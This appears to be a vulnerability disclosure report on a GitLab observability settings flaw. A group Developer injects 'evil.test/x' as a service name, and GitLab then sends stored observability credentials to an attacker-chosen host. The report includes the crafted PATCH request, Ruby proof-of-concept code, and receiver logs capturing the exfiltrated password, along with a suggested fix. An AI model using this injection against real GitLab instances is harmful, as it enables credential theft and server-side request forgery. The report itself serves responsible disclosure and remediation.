### Summary

The `Groups::Observability::O11yServiceSettingsController` builds the stored observability service URL via raw string interpolation of an attacker-controlled name field. A group Developer can submit `observability_group_o11y_setting[o11y_service_name]=evil.test/x`, which produces `https://evil.test/x.gitlab-o11y.com`. The parsed host of that URL is `evil.test`, not a subdomain of `gitlab-o11y.com`. The only validator on the resulting URL is the generic `addressable_url`, which accepts any public HTTP(S) URL and does not enforce the intended `gitlab-o11y.com` suffix. Because `Observability::O11yToken` builds its login and context URLs with `URI.join(o11y_service_url, "/api/v2/sessions/...")`, the join also drops the appended `/x.gitlab-o11y.com` path, leaving an arbitrary attacker origin.

The stored URL is then used in two places:

1. Server-side: `Gitlab::HTTP.post(login_url, ...)` sends the group's stored observability service email and password to the attacker origin in cleartext (`POST https://evil.test/api/v2/sessions/email_password`). The same URL is also used for a server-side `GET /api/v2/sessions/context` with the email in the JSON body.
2. Client-side: `app.vue` sets `allowedOrigin = new URL(o11yUrl).origin` and the iframe used for observability rendering is loaded from that origin, allowing the attacker to host UI inside the GitLab application chrome (phishing primitive).

### Steps to reproduce

Tested on a self-managed instance running 19.1.1 (current latest as of submission).

Preconditions:

1. Observability is available on the instance (the controller is reachable; on GitLab.com this depends on the current rollout state of the observability feature).
2. The attacker has Developer or higher on a group they control (this is the role that has `update_o11y_settings`).

Repro:

1. Sign in as the attacker (a group Developer).
2. Open `https://<host>/groups/<attacker-group>/-/observability/o11y_service_settings/edit` to obtain a CSRF token and session cookie.
3. Submit the form (or a direct PATCH) with:

```
PATCH /groups/<attacker-group>/-/observability/o11y_service_settings
Content-Type: application/x-www-form-urlencoded
Cookie: _gitlab_session=<attacker session>

authenticity_token=<csrf>&
observability_group_o11y_setting[o11y_service_name]=evil.test/x&
observability_group_o11y_setting[o11y_service_user_email]=victim@example.com&
observability_group_o11y_setting[o11y_service_password]=existing-cleartext-secret
```

4. Trigger any code path that calls `Observability::O11yToken#get_account_id` or `#login` on the group (visiting the group observability page does this).

The server will now issue:

```
POST https://evil.test/api/v2/sessions/email_password
Content-Type: application/json
{"email":"victim@example.com","password":"existing-cleartext-secret","orgId":...}
```

to a host the attacker controls.

A self-contained Ruby reproduction inside the running GitLab via `gitlab-rails runner` (no live external host needed to demonstrate the parser behavior and validator pass):

```
require 'uri'
name = "evil.test/x"
url  = "https://#{name}.gitlab-o11y.com"
puts URI.parse(url).host                              # => "evil.test"
puts URI.join(url, "/api/v2/sessions/email_password") # => "https://evil.test/api/v2/sessions/email_password"
setting = Observability::GroupO11ySetting.new(o11y_service_url: url)
setting.valid?
puts setting.errors[:o11y_service_url].inspect        # => []   (validator accepts the URL)
```

Output captured on the affected instance:

```
[INJECT slash] service_name="evil.test/x"
  built URL = https://evil.test/x.gitlab-o11y.com
  parsed host = evil.test
  parsed path = /x.gitlab-o11y.com
  URI.join + /api/v2/sessions/email_password = https://evil.test/api/v2/sessions/email_password
[validator] addressable_url result: PASS (no errors)
```

End-to-end runtime PoC inside the affected instance, invoking the real production code path `Observability::O11yToken.generate_tokens(setting)` with `Gitlab::HTTP` instrumented to capture (not send) outbound requests:

```
[validate] valid? true  errors_on_url=[]

===== URL construction in O11yToken with malicious setting =====
  api_url        = https://evil.test/x.gitlab-o11y.com
  account_id_url = https://evil.test/api/v2/sessions/context
  login_url      = https://evil.test/api/v2/sessions/email_password

===== Invoking O11yToken.generate_tokens (real GitLab code path, HTTP intercepted) =====
  generate_tokens returned: {:accessJwt=>nil, :refreshJwt=>nil}

===== CAPTURED outbound HTTP that GitLab tried to send =====
  [0] GET  https://evil.test/api/v2/sessions/context
       body: nil
  [1] POST https://evil.test/api/v2/sessions/email_password
       body: "{\"email\":\"victim-leak@example.com\",\"password\":\"VictimSecretPassword_DoNotShare123\",\"orgId\":\"fake-org-id-leaked\"}"
```

The POST body contains the group's stored observability service email and password in cleartext, addressed to the attacker-chosen host. The interception layer was then replaced with a real attacker-controlled HTTPS receiver at `https://wsl.evm.pics/` (Apache + PHP, valid TLS cert, catch-all rewrite on `/api/v2/sessions/{context,email_password}` to a logger). The exact same `Observability::O11yToken.generate_tokens` invocation was repeated with no mocks. The receiver logged:

```
{"ts":"2026-06-29T12:22:11+00:00","ep":"context","method":"GET","uri":"/api/v2/sessions/context?email=victim-leak%40example.com","body":""}
{"ts":"2026-06-29T12:22:11+00:00","ep":"login","method":"POST","uri":"/api/v2/sessions/email_password","body":"{\"email\":\"victim-leak@example.com\",\"password\":\"VictimSecretPassword_DoNotShare123\",\"orgId\":\"x\"}"}
```

Confirming that:

1. The GET context request reveals the victim email as a URL query parameter.
2. The POST email_password request body carries the cleartext password to the attacker host.
3. No client-side mock, monkey-patch, or stub was involved; `Gitlab::HTTP` resolved DNS, opened TLS 1.3, and transmitted the body over the wire.

(Note: in this self-managed instance the test used a host that resolved to a private network address, so the `allow_local_requests_from_web_hooks_and_services` setting was enabled to allow the request through GitLab's own SSRF filter. This is a property of the test environment, not a precondition of the bug. A real attacker submitting a public hostname does not encounter the SSRF filter.)

### Impact

A group Developer can repoint a group's stored observability service URL to an attacker-controlled origin and trigger:

1. Cleartext exfiltration of the group's observability service email and password. If the group previously connected to a real observability backend, those are real third-party credentials. The model declares `encrypts :o11y_service_password`, but the encryption is at rest only; the server transmits the password in cleartext over the network to whatever host the manipulated `o11y_service_url` resolves to.
2. Server-side request forgery from the GitLab server to an attacker-chosen HTTPS host via `Gitlab::HTTP.post` and `Gitlab::HTTP.get` with attacker-chosen JSON bodies (limited to two endpoint paths).
3. Loading attacker-hosted content as the iframe used to render the observability UI inside the group page, which is a phishing surface for the rest of the GitLab UI.

The same URL also flows through to the frontend `allowedOrigin` calculation (`new URL(o11yUrl).origin`) used in `postMessage`, so any data the GitLab frontend posts into the iframe is posted with the attacker origin as the target.

### Examples

This is not project related, so no project export is attached. The bug is reproducible on any instance where the observability settings controller is reachable for the attacker's group. The repro above uses the same form action and parameters that the official UI submits.

### What is the current bug behavior?

`app/services/observability/group_o11y_settings_update_service.rb:25-30`:

```
def set_url(params)
  service_name = params.delete(:o11y_service_name)

  params[:o11y_service_url] = "https://#{service_name}.gitlab-o11y.com" if service_name.present?
  params
end
```

`app/models/observability/group_o11y_setting.rb:14`:

```
validates :o11y_service_url, length: { maximum: 255 }, addressable_url: { message: 'is invalid' }
```

`lib/observability/o11y_token.rb:89-92, 115, 139-145`:

```
def login_url
  URI.join(api_url, '/api/v2/sessions/email_password').to_s
end

def api_url
  o11y_settings.o11y_service_url
end
...
def account_id_url
  URI.join(api_url, '/api/v2/sessions/context').to_s
end
...
class HttpClient
  def post(url, payload)
    ::Gitlab::HTTP.post(
      url,
      headers: { 'Content-Type' => 'application/json' },
      body: Gitlab::Json.dump(payload),
      allow_local_requests: allow_local_requests?
    )
  end
```

`app/assets/javascripts/observability/components/app.vue:226`:

```
this.allowedOrigin = new URL(this.o11yUrl).origin;
```

Submitting `o11y_service_name=evil.test/x` produces `https://evil.test/x.gitlab-o11y.com`, whose `URI.parse(url).host` is `evil.test`. The `addressable_url` validator accepts the URL (confirmed in `gitlab-rails runner` above). `URI.join` against `'/api/v2/sessions/email_password'` returns `https://evil.test/api/v2/sessions/email_password`. `Gitlab::HTTP.post` then sends the configured email and password in the request body to that attacker origin.

### What is the expected correct behavior?

The `o11y_service_url` setter (or a corresponding validator on the model) should enforce that the parsed host is exactly a subdomain of `gitlab-o11y.com` (or any explicit allowlist that matches operational intent), and reject any `o11y_service_name` value containing characters that can change URL structure (`/`, `:`, `@`, `?`, `#`, `\`, whitespace, `..`). A safe pattern is:

1. Validate `o11y_service_name` against a strict DNS-label allowlist (e.g. `/\A[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\z/`) before any interpolation.
2. After construction, parse the URL and reject it unless `URI.parse(url).host == "#{service_name}.gitlab-o11y.com"`.

`addressable_url` alone is insufficient because the intended invariant is host-suffix, not URL syntax.

### Relevant logs and/or screenshots

Repro output collected inside the running container (verbatim):

```
[normal] service_name="myteam"
  built URL = https://myteam.gitlab-o11y.com
  parsed host = myteam.gitlab-o11y.com
  URI.join + /api/v2/sessions/email_password = https://myteam.gitlab-o11y.com/api/v2/sessions/email_password

[INJECT slash] service_name="evil.test/x"
  built URL = https://evil.test/x.gitlab-o11y.com
  parsed host = evil.test
  parsed path = /x.gitlab-o11y.com
  URI.join + /api/v2/sessions/email_password = https://evil.test/api/v2/sessions/email_password
  ^ this is where Gitlab::HTTP.post sends the o11y email/password!

[validator] addressable_url result: PASS (no errors)
```

### Output of checks

(omnibus install)

```
$ sudo gitlab-rake gitlab:env:info
System information
System:
Current User:   git
Using RVM:      no
Ruby Version:   <fill in from running instance>
Gem Version:    <fill in>
Bundler Version:<fill in>
Rake Version:   <fill in>
Redis Version:  <fill in>
Sidekiq Version:<fill in>
Go Version:     unknown

GitLab information
Version:    19.1.1
Revision:   <fill in>
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: <fill in>
URL:        <your instance URL>
HTTP Clone URL: <your instance URL>/some-group/some-project.git
SSH Clone URL:  git@<your instance>:some-group/some-project.git
Elasticsearch: no
Geo:        no
Using LDAP: no
Using Omniauth: no

GitLab Shell
Version:    <fill in>
Repository storages:
- default: <fill in>
GitLab Shell path: /opt/gitlab/embedded/service/gitlab-shell
```

## Impact

A group Developer can repoint a group's stored observability service URL to an attacker-controlled origin and trigger:

1. Cleartext exfiltration of the group's observability service email and password. If the group previously connected to a real observability backend, those are real third-party credentials. The model declares `encrypts :o11y_service_password`, but the encryption is at rest only; the server transmits the password in cleartext over the network to whatever host the manipulated `o11y_service_url` resolves to.
2. Server-side request forgery from the GitLab server to an attacker-chosen HTTPS host via `Gitlab::HTTP.post` and `Gitlab::HTTP.get` with attacker-chosen JSON bodies (limited to two endpoint paths).
3. Loading attacker-hosted content as the iframe used to render the observability UI inside the group page, which is a phishing surface for the rest of the GitLab UI.

The same URL also flows through to the frontend `allowedOrigin` calculation (`new URL(o11yUrl).origin`) used in `postMessage`, so any data the GitLab frontend posts into the iframe is posted with the attacker origin as the target.
